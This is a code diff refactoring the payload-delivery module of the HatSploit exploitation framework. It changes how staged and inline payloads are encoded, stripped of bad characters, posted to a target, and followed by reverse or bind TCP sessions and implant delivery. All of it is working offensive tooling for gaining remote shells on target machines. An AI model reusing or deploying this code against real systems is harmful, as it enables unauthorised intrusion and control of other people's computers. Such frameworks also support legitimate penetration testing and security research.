@@ -28,6 +28,7 @@ import time
 from typing import Optional, Tuple, Union
 
 from hatsploit.lib.option import *
+from hatsploit.lib.complex import *
 
 from pex.platform.types import Platform
 from pex.post import Post, PostTools
@@ -38,8 +39,9 @@ from hatsploit.lib.encoder import Encoder
 from hatsploit.lib.payloads import Payloads
 from hatsploit.lib.handle import Handle
 
-from badges import Badges
+from hatsploit.lib.payload.const import *
 
+from badges import Badges
 from pawn import Pawn
 
 
@@ -61,16 +63,17 @@ class Send(object):
         self.post_tools = PostTools()
 
         self.badges = Badges()
-
         self.pawn = Pawn()
 
         self.types = [
-            'one_side',
-            'reverse_tcp',
-            'bind_tcp'
+            OneSide,
+            ReverseTCP,
+            BindTCP
         ]
 
-    def handle_session(self, host: str, port: int, type: str = 'one_side', timeout: Optional[int] = None,
+    def handle_session(self, host: str, port: int,
+                       type: str = OneSide,
+                       timeout: Optional[int] = None,
                        session: Optional[Session] = None) -> Tuple[Union[Session, socket.socket], str]:
         """ Handle session.
 
@@ -87,7 +90,7 @@ class Send(object):
         if type not in self.types:
             raise RuntimeError(f"Invalid payload type: {type}!")
 
-        if type == 'reverse_tcp':
+        if type == ReverseTCP:
             if not host or not port:
                 raise RuntimeError("Reverse TCP requires host and port set!")
 
@@ -98,7 +101,7 @@ class Send(object):
 
             return client, host
 
-        elif type == 'bind_tcp':
+        elif type == BindTCP:
             if not host or not port:
                 raise RuntimeError("Bind TCP requires host and port set!")
 
@@ -126,6 +129,7 @@ class Send(object):
             raise RuntimeError("Payload was not found!")
 
         step = 1
+
         while True:
             if not hasattr(payload, f'phase{step}'):
                 break
@@ -139,7 +143,8 @@ class Send(object):
             if not phase:
                 raise RuntimeError(f"Payload phase #{str(step)} generated incorrectly!")
 
-            self.badges.print_process(f"Sending payload phase #{str(step)} ({str(len(phase))} bytes)...")
+            self.badges.print_process(
+                f"Sending payload phase #{str(step)} ({str(len(phase))} bytes)...")
             client.send(phase)
 
             time.sleep(.5)
@@ -158,27 +163,57 @@ class Send(object):
             if implant:
                 time.sleep(.5)
 
-                self.badges.print_process(f"Sending payload ({str(len(implant))} bytes)...")
+                self.badges.print_process(
+                    f"Sending payload ({str(len(implant))} bytes)...")
                 client.send(implant)
 
-    def shell_payload(self, payload: Payload, host: str, port: int,
-                      space: int = 2048, encoder: Optional[Encoder] = None,
-                      *args, **kwargs) -> Tuple[Union[socket.socket, str], str]:
-        """ Send payload if the destination is shell.
+    def get_phase(self, payload: Payload) -> Union[bytes, None]:
+        """ Get first payload phase.
 
-        :param Payload payload: payload
+        :param Payload payload: payload object
+        :return Union[bytes, None]: phase if exists
+        """
+
+        type = payload.details['Type']
+        type = type if type in [ReverseTCP, BindTCP] else ReverseTCP
+
+        phase = self.pawn.auto_pawn(
+            platform=payload.details['Platform'],
+            arch=payload.details['Arch'],
+            type=type
+        )
+
+        if phase:
+            if type == ReverseTCP:
+                phase.set('host', payload.rhost.value)
+                phase.set('port', payload.rport.value)
+
+            elif type == BindTCP:
+                phase.set('port', payload.rport.value)
+
+            return self.pawn.run_pawn(phase)
+
+    def drop_payload(self, payload: PayloadOption, host: str, port: int,
+                     encoder: Optional[EncoderOption] = None,
+                     *args, **kwargs) -> Tuple[Union[socket.socket, str], str]:
+        """ Send payload.
+
+        :param PayloadOption payload: payload
         :param str host: host to start listener on
         :param int port: port to start listener on
-        :param int space: maximum payload size
-        :param Optional[Encoder] encoder: encoder to apply
+        :param Optional[EncoderOption] encoder: encoder to apply
         :return Tuple[Union[socket.socket, str], str]: final socket and host
         """
 
         sender = kwargs.get('sender', None)
-        arguments = payload.details.get('Arguments', '')
+        config = payload.config
+        payload = payload.payload
 
         if not payload:
             raise RuntimeError("Payload was not found!")
+
+        encoder = encoder.encoder
+        arguments = payload.details.get('Arguments', '')
 
         if not sender:
             raise RuntimeError("Payload sender is not specified!")
@@ -190,51 +225,51 @@ class Send(object):
         arch = payload.details['Arch']
         type = payload.details['Type']
 
-        main = self.payloads.run_payload(
+        buffer = self.payloads.run_payload(
             payload=payload,
-            encoder=encoder
+            encoder=encoder,
+            badchars=config.get('BadChars', b'')
         )
 
-        if len(main) >= space and hasattr(payload, 'phase'):
-            phase = self.payloads.run_payload(
-                payload=payload,
-                encoder=encoder,
-                method='phase'
+        if len(buffer) > config.get('Space', 2048) or payload.details['Phased']:
+            phase = self.get_phase(payload)
+
+            if not phase:
+                raise RuntimeError("No phase available for this payload!")
+
+            phase = self.payloads.pack_payload(
+                payload=self.payloads.fix_badchars(
+                    payload, phase, config.get('BadChars', b'')),
+                platform=platform,
+                arch=arch
             )
 
-            if phase:
-                phase = self.payloads.pack_payload(
-                    payload=phase,
-                    platform=platform,
-                    arch=arch
-                )
+            self.badges.print_process(
+                f"Sending payload phase ({str(len(phase))} bytes)...")
+            self.post.post(
+                payload=phase,
+                platform=platform,
+                arch=arch,
+                *args, **kwargs
+            )
 
-                self.badges.print_process(f"Sending payload phase ({str(len(phase))} bytes)...")
-                self.post.post(
-                    payload=phase,
-                    platform=platform,
-                    arch=arch,
-                    *args, **kwargs
-                )
+            type = type if type in [ReverseTCP, BindTCP] else ReverseTCP
+            client, host = self.handle_session(
+                host=host, port=port, type=type)
 
-                if type not in ['reverse_tcp', 'bind_tcp']:
-                    type = 'reverse_tcp'
+            self.send_implant(payload, client, encoder)
+            return client, host
 
-                client, host = self.handle_session(
-                    host=host, port=port, type=type)
-
-                self.send_implant(payload, client, encoder)
-                return client, host
-
-        phase = self.payloads.pack_payload(
-            payload=main,
+        buffer = self.payloads.pack_payload(
+            payload=buffer,
             platform=platform,
             arch=arch
         )
 
-        self.badges.print_process(f"Sending payload ({str(len(phase))} bytes)...")
+        self.badges.print_process(
+            f"Sending payload ({str(len(buffer))} bytes)...")
         self.post.post(
-            payload=phase,
+            payload=buffer,
             platform=platform,
             arch=arch,
             arguments=arguments,
@@ -244,20 +279,21 @@ class Send(object):
         return self.handle_session(
             host=host, port=port, type=type)
 
-    def memory_payload(self, payload: Payload, host: str, port: int,
-                       space: int = 2048, encoder: Optional[Encoder] = None,
+    def inline_payload(self, payload: Payload, host: str, port: int,
+                       encoder: Optional[Encoder] = None,
                        *args, **kwargs) -> Tuple[Union[socket.socket, str], str]:
-        """ Send payload if the destination is memory.
+        """ Send payload if inline.
 
         :param Payload payload: payload
         :param str host: host to start listener on
         :param int port: port to start listener on
-        :param int space: maximum payload size
         :param Optional[Encoder] encoder: encoder to apply
         :return Tuple[Union[socket.socket, str], str]: final socket and host
         """
 
         sender = kwargs.get('sender', None)
+        config = payload.config
+        payload = payload.payload
 
         if not payload:
             raise RuntimeError("Payload was not found!")
@@ -269,38 +305,38 @@ class Send(object):
             raise RuntimeError("Host and port were not found for payload!")
 
         type = payload.details['Type']
+        encoder = encoder.encoder
 
-        main = self.payloads.run_payload(
+        buffer = self.payloads.run_payload(
             payload=payload,
-            encoder=encoder
+            encoder=encoder,
+            badchars=config.get('BadChars', b'')
         )
 
-        if len(main) >= space and hasattr(payload, 'phase'):
-            phase = self.payloads.run_payload(
-                payload=payload,
-                encoder=encoder,
-                method='phase'
+        if len(buffer) > config.get('Space', 2048) or payload.details['Phased']:
+            phase = self.get_phase(payload)
+
+            if not phase:
+                raise RuntimeError("No phase available for this payload!")
+
+            self.badges.print_process(
+                f"Sending payload phase ({str(len(phase))} bytes)...")
+            self.post_tools.post_payload(
+                payload=phase,
+                *args, **kwargs
             )
 
-            if phase:
-                self.badges.print_process(f"Sending payload phase ({str(len(phase))} bytes)...")
-                self.post_tools.post_payload(
-                    payload=phase,
-                    *args, **kwargs
-                )
+            type = type if type in [ReverseTCP, BindTCP] else ReverseTCP
+            client, host = self.handle_session(
+                host=host, port=port, type=type)
 
-                if type not in ['reverse_tcp', 'bind_tcp']:
-                    type = 'reverse_tcp'
+            self.send_implant(payload, client, encoder)
+            return client, host
 
-                client, host = self.handle_session(
-                    host=host, port=port, type=type)
-
-                self.send_implant(payload, client, encoder)
-                return client, host
-
-        self.badges.print_process(f"Sending payload ({str(len(main))} bytes)...")
+        self.badges.print_process(
+            f"Sending payload ({str(len(buffer))} bytes)...")
         self.post_tools.post_payload(
-            payload=main,
+            payload=buffer,
             *args, **kwargs
         )
 
